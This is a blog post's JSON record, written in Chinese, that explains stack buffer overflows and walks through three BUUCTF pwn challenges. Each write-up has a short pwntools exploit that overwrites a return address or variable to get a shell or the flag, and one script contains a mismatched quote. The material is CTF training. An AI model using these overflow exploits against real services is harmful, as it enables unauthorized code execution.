{"title":"栈溢出","uid":"a37c8c0bbab0e8b3e41a4408c944d53f","slug":"栈溢出","date":"2021-05-23T05:47:11.000Z","updated":"2021-06-05T10:24:14.153Z","comments":true,"path":"api/articles/栈溢出.json","keywords":null,"cover":"https://i.loli.net/2021/05/24/6ewQX9kiC7ZpuOd.jpg","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>\n<ul>\n<li>程序必须向栈上写入数据。</li>\n<li>写入的数据大小没有被良好地控制。</li>\n</ul>\n<h1 id=\"rip\"><a href=\"#rip\" class=\"headerlink\" title=\"rip\"></a>rip</h1><h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，发现没开什么保护，丢进IDA里面看一下</p>\n<p><img src=\"https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png\" alt=\"image.png\"></p>\n<p>发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag<img src=\"https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png\" alt=\"image.png\"></p>\n<p>开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去<img src=\"https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png\" alt=\"image.png\"></p>\n<p>之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量<img src=\"https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png\" alt=\"image.png\"></p>\n<p>得到偏移量就可以写exp了</p>\n<h2 id=\"编写EXP\"><a href=\"#编写EXP\" class=\"headerlink\" title=\"编写EXP\"></a>编写EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">28652</span>)</span><br><span class=\"line\">fun = <span class=\"number\">0x401186</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">23</span>+p64(fun+<span class=\"number\">1</span>)  //平衡堆栈</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"warmup-csaw-2016\"><a href=\"#warmup-csaw-2016\" class=\"headerlink\" title=\"warmup_csaw_2016\"></a>warmup_csaw_2016</h1><h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开<img src=\"https://i.loli.net/2021/05/24/rCDanMEpmvbN28R.png\" alt=\"image.png\"></p>\n<p>丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量<img src=\"https://i.loli.net/2021/05/24/bA1kDTgImdNEpc2.png\" alt=\"image.png\"></p>\n<p>还是和上面一题一样的方法计算偏移量</p>\n<p><img src=\"https://i.loli.net/2021/05/24/1oBRpDXmTdVPvru.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">26972</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x40060D</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ciscn-2019-n-1\"><a href=\"#ciscn-2019-n-1\" class=\"headerlink\" title=\"ciscn_2019_n_1\"></a>ciscn_2019_n_1</h1><h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>老规矩，先检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行<img src=\"https://i.loli.net/2021/05/25/smzhw5ZEVCYNP4W.png\" alt=\"image.png\"></p>\n<p>扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125<img src=\"https://i.loli.net/2021/05/25/wFnCVTSrxtgHf2i.png\" alt=\"image.png\"></p>\n<p><img src=\"https://i.loli.net/2021/05/25/nxwgLFy6OBIJueS.png\" alt=\"image.png\"></p>\n<p>因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制</p>\n<h3 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">25675</span>)</span><br><span class=\"line\">payload = ‘a<span class=\"string\">&#x27; *(0x30-0x4) + p64(0x41348000)</span></span><br><span class=\"line\"><span class=\"string\">p.sendline(payload)</span></span><br><span class=\"line\"><span class=\"string\">p.interactive()</span></span><br></pre></td></tr></table></figure>\n\n","text":"原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[{"name":"PWN","slug":"PWN","count":4,"path":"api/categories/PWN.json"}],"tags":[{"name":"积累","slug":"积累","count":2,"path":"api/tags/积累.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#rip\"><span class=\"toc-text\">rip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E5%86%99EXP\"><span class=\"toc-text\">编写EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#warmup-csaw-2016\"><span class=\"toc-text\">warmup_csaw_2016</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ciscn-2019-n-1\"><span class=\"toc-text\">ciscn_2019_n_1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU MISC刷题记录","uid":"8178986268830468ddd9f4a48060d9de","slug":"BUU-MISC刷题记录","date":"2021-05-31T00:48:04.000Z","updated":"2021-06-06T02:54:25.341Z","comments":true,"path":"api/articles/BUU-MISC刷题记录.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/eXnPUrYdWb3qpIN.jpg","text":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag 二维码在线扫码，得到secret is here 用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件 利用binwalk...","link":"","photos":[],"count_time":{"symbolsCount":980,"symbolsTime":"1 mins."},"categories":[{"name":"MISC","slug":"MISC","count":4,"path":"api/categories/MISC.json"}],"tags":[{"name":"write up","slug":"write-up","count":2,"path":"api/tags/write-up.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"CISCN复现","uid":"dde0577c288faf648c0d6f90bbb39dc6","slug":"CISCN复现","date":"2021-05-18T11:25:16.000Z","updated":"2021-05-23T05:52:38.991Z","comments":true,"path":"api/articles/CISCN复现.json","keywords":null,"cover":"https://i.loli.net/2021/05/18/oDJvw6ieQjbXmrq.jpg","text":"前言初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。 MISC隔空传话附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是P...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"MISC","slug":"MISC","count":4,"path":"api/categories/MISC.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}